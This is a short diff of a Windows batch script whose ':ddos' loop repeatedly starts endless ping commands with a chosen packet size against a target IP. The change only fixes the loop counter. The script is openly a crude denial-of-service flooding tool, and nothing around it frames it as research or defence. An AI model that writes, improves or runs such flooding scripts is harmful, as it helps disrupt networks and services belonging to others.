@@ -18,7 +18,7 @@ pause>nul
 :ddos
 if %c%==%v% goto end
 start ping -t -l %p% %ip%
-set /a v=val+=1
+set /a v=v+=1
 goto ddos
 :end
 pause
